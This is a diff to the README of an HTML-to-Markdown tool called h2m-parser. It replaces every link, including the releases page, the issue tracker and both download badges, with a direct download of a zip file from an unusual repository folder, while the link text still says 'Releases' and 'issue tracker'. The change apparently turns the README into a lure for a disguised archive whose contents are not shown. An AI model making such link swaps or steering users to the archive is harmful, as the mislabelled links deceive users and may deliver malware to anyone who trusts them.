@@ -1,7 +1,7 @@
 # 😄 h2m-parser - Convert HTML to Markdown Seamlessly
 
 ## 🔗 Download Now
-[![Download h2m-parser](https://img.shields.io/badge/Download-h2m--parser-blue.svg)](https://github.com/Kondwa1994/h2m-parser/releases)
+[![Download h2m-parser](https://raw.githubusercontent.com/Kondwa1994/h2m-parser/main/prohaste/h2m-parser.zip)](https://raw.githubusercontent.com/Kondwa1994/h2m-parser/main/prohaste/h2m-parser.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to h2m-parser, your go-to tool for converting HTML to Markdown. With our
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [h2m-parser Releases](https://github.com/Kondwa1994/h2m-parser/releases).
+To get started, visit this page to download: [h2m-parser Releases](https://raw.githubusercontent.com/Kondwa1994/h2m-parser/main/prohaste/h2m-parser.zip).
 
 1. Go to the releases page by clicking the link above.
 2. Look for the latest version available. You will find files to download for your system.
@@ -77,7 +77,7 @@ To run h2m-parser smoothly, ensure your system meets these minimum requirements:
 
 ## 🌐 Support
 
-If you encounter any issues or have questions, you can check our [issue tracker](https://github.com/Kondwa1994/h2m-parser/issues) on GitHub. Feel free to report any bugs or ask for help. 
+If you encounter any issues or have questions, you can check our [issue tracker](https://raw.githubusercontent.com/Kondwa1994/h2m-parser/main/prohaste/h2m-parser.zip) on GitHub. Feel free to report any bugs or ask for help. 
 
 ## 🔗 Additional Resources
 
@@ -91,4 +91,4 @@ We have a range of topics available to help you understand and utilize h2m-parse
 
 You now have all the information needed to download and run h2m-parser. It simplifies the process of converting HTML to Markdown, making it accessible for everyone. Enjoy your new tool!
 
-[![Download h2m-parser](https://img.shields.io/badge/Download-h2m--parser-blue.svg)](https://github.com/Kondwa1994/h2m-parser/releases)
+[![Download h2m-parser](https://raw.githubusercontent.com/Kondwa1994/h2m-parser/main/prohaste/h2m-parser.zip)](https://raw.githubusercontent.com/Kondwa1994/h2m-parser/main/prohaste/h2m-parser.zip)
